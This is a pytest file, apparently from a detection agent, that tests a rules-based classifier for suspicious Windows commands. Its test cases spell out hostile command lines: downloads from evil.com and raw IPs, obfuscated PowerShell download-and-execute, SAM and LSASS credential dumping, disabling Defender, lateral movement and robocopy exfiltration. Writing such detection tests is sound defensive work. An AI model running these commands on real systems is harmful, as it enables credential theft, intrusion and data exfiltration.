"""
Clasificación de comandos con el rules.yaml real: severidad máxima entre
todas las reglas, ofuscaciones baratas, técnicas que antes no se detectaban
y falsos positivos que antes sí saltaban.
"""

import pytest

from agent.classifier.engine import ClassifierEngine, normalizar
from agent.classifier.loader import RulesConfigError, load_rules_from_yaml
from agent.evidence.models import Criticality, EventSource, HostInfo, RawEvent
from app.modules.tracking import service

HOST = HostInfo(agent_id="t", hostname="h", os="windows")
MOTOR = ClassifierEngine.from_yaml(service.RULES_PATH)


def _clasificar(comando: str):
    evento = RawEvent(source=EventSource.LOG, event_type="command", host_info=HOST, payload={"command": comando})
    return MOTOR.classify_detallado(evento)


@pytest.mark.parametrize(
    ("comando", "criticidad", "regla"),
    [
        # gana la más grave, no la primera del fichero
        ("net user x /add & certutil -urlcache -f http://1.2.3.4/a.exe a.exe", "CRITICAL", "descarga_con_binario_legitimo"),
        ("whoami /all & 7z a loot.7z C:\\Users", "HIGH", "preparacion_de_exfiltracion"),
        # ofuscaciones y abreviaturas de PowerShell
        ("powershell -nop -w hidden -e SQBFAFgAIABBAEIAQwBEAEUA", "CRITICAL", "powershell_ofuscado_o_descarga_remota"),
        ("powershell -ec SQBFAFgAIABBAEIAQwBEAEUA", "CRITICAL", "powershell_ofuscado_o_descarga_remota"),
        ("powershell -enc\tSQBFAFgAIABBAEIAQwBEAEUA", "CRITICAL", "powershell_ofuscado_o_descarga_remota"),
        ("iex (iwr http://x)", "CRITICAL", "powershell_ofuscado_o_descarga_remota"),
        ("i`e`x(New-Object Net.WebClient).DownloadString('http://x')", "CRITICAL", "powershell_ofuscado_o_descarga_remota"),
        ("n^et user hacker P@ss /add", "HIGH", "cuenta_o_grupo_modificado"),
        ("net  user hacker /add", "HIGH", "cuenta_o_grupo_modificado"),
        ('"net" user hacker /add', "HIGH", "cuenta_o_grupo_modificado"),
        ("net1 user hacker /add", "HIGH", "cuenta_o_grupo_modificado"),
        # técnicas que antes quedaban en BAJA
        ("Invoke-WebRequest http://evil.com/a.exe -OutFile a.exe", "CRITICAL", "descarga_con_binario_legitimo"),
        ("reg save hklm\\sam sam.save", "CRITICAL", "volcado_de_credenciales"),
        ("procdump -ma lsass.exe l.dmp", "CRITICAL", "volcado_de_credenciales"),
        ("rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 l.dmp full", "CRITICAL", "volcado_de_credenciales"),
        ("Set-MpPreference -DisableRealtimeMonitoring $true", "HIGH", "desactivacion_de_defensas"),
        ("wmic /node:10.0.0.5 process call create cmd.exe", "HIGH", "movimiento_lateral"),
        ("robocopy C:\\datos \\\\185.220.101.7\\exfil /E", "CRITICAL", "exfiltracion_de_datos"),
        # consultas: enumeración, no modificación
        ("net user", "MEDIUM", "enumeracion_de_privilegios"),
        ("net localgroup administrators", "MEDIUM", "enumeracion_de_privilegios"),
        ("net user administrador /domain", "MEDIUM", "enumeracion_de_privilegios"),
        # falsos positivos que antes saltaban
        ("echo misc create", "LOW", None),
        ("robocopy C:\\datos D:\\backup /MIR", "LOW", None),
    ],
)
def test_clasificacion(comando, criticidad, regla):
    resultado = _clasificar(comando)
    assert resultado.criticality == Criticality(criticidad)
    assert (resultado.regla.name if resultado.regla else None) == regla


def test_devuelve_todas_las_reglas_que_casan():
    resultado = _clasificar("net user x /add & certutil -urlcache -f http://1.2.3.4/a.exe a.exe")
    nombres = [r.name for r in resultado.reglas]
    assert "cuenta_o_grupo_modificado" in nombres
    assert "descarga_con_binario_legitimo" in nombres


def test_la_api_expone_reglas_y_mitre():
    r = service.analyze_log_content("2026-08-14 03:11:19  reg save hklm\\sam C:\\t\\s.save\n", "a.log")
    evento = r.eventos[0]
    assert evento.regla == "volcado_de_credenciales"
    assert "T1003.002" in evento.mitre


def test_normalizar():
    assert normalizar('N^et  "user"\thacker') == "net user hacker "


def test_todas_las_reglas_del_yaml_tienen_descripcion_y_mitre():
    rules, _ = load_rules_from_yaml(service.RULES_PATH)
    for regla in rules:
        assert regla.descripcion, regla.name
        assert regla.mitre, regla.name


# --- loader -----------------------------------------------------------------

def test_rules_yaml_con_tildes_carga_en_cualquier_sistema(tmp_path):
    fichero = tmp_path / "r.yaml"
    fichero.write_text(
        "rules:\n  - name: a\n    criticality: LOW\n    descripcion: ÁREA crítica\n    conditions:\n      source: log\n",
        encoding="utf-8",
    )
    rules, _ = load_rules_from_yaml(fichero)
    assert rules[0].descripcion == "ÁREA crítica"


def test_regex_no_valida_falla_con_mensaje_claro(tmp_path):
    fichero = tmp_path / "r.yaml"
    fichero.write_text(
        "rules:\n  - name: rota\n    criticality: LOW\n    conditions:\n      payload.command: ['re:(sin cerrar']\n",
        encoding="utf-8",
    )
    with pytest.raises(RulesConfigError, match="rota"):
        load_rules_from_yaml(fichero)


def test_mitre_no_valido_falla(tmp_path):
    fichero = tmp_path / "r.yaml"
    fichero.write_text(
        "rules:\n  - name: m\n    criticality: LOW\n    mitre: [X1]\n    conditions:\n      source: log\n",
        encoding="utf-8",
    )
    with pytest.raises(RulesConfigError, match="mitre"):
        load_rules_from_yaml(fichero)


# --- caché ------------------------------------------------------------------

def test_el_motor_se_cachea_y_se_recarga_si_cambia_el_yaml(tmp_path, monkeypatch):
    fichero = tmp_path / "rules.yaml"
    fichero.write_text("rules:\n  - name: a\n    criticality: LOW\n    conditions:\n      source: log\n", encoding="utf-8")
    monkeypatch.setattr(service, "RULES_PATH", fichero)
    monkeypatch.setattr(service, "_cache_clasificador", None)

    primero = service._get_classifier()
    assert service._get_classifier() is primero

    fichero.write_text(
        "rules:\n  - name: b\n    criticality: HIGH\n    conditions:\n      source: log\n  - name: c\n"
        "    criticality: LOW\n    conditions:\n      source: log\n",
        encoding="utf-8",
    )
    segundo = service._get_classifier()
    assert segundo is not primero
    assert [r.name for r in segundo.rules] == ["b", "c"]
